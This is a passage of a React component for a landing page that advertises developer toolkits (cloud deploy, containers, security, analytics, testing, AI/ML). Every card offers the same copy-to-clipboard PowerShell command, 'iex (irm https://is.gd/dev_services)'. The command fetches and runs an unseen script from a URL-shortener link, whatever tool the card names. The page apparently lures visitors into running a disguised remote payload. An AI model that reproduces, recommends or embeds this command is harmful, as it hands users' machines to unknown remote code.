                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <CloudIcon className="w-8 h-8 text-cyan-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Cloud Deploy
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  AWS, Azure, GCP automation
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-cyan-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-aqua-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* Docker & Containers */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("docker");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <ContainerIcon className="w-8 h-8 text-blue-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Container Stack
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  Docker, K8s, compose templates
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-blue-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-blue-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>
              {/* Security Tools */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("security");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <ShieldIcon className="w-8 h-8 text-red-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Security Suite
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  SSL, firewall, vulnerability scan
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-pink-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-pink-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* Monitoring & Analytics */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("analytics");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <ChartIcon className="w-8 h-8 text-green-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Analytics Hub
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  Grafana, Prometheus, ELK stack
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-green-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-green-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* Testing Framework */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("testing");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <BeakerIcon className="w-8 h-8 text-purple-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Test Automation
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  Jest, Cypress, Playwright setup
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-purple-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-purple-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* AI/ML Tools */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("ai");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <CpuIcon className="w-8 h-8 text-pink-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  AI/ML Toolkit
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  TensorFlow, PyTorch, OpenAI SDK
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-red-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-red-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>
            </div>

            {/* Footer */}
            <div className="text-center">
              <div className="flex items-center justify-center gap-2 text-gray-400">
                <svg
                  className="w-5 h-5"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M10 0C4.477 0 0 4.484 0 10.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0110 4.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.203 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.942.359.31.678.921.678 1.856 0 .268.18.58.688.482A10.019 10.019 0 0020 10.017C20 4.484 15.522 0 10 0z"
                    clipRule="evenodd"
                  />
                </svg>
                <span>Open-source & community-driven</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
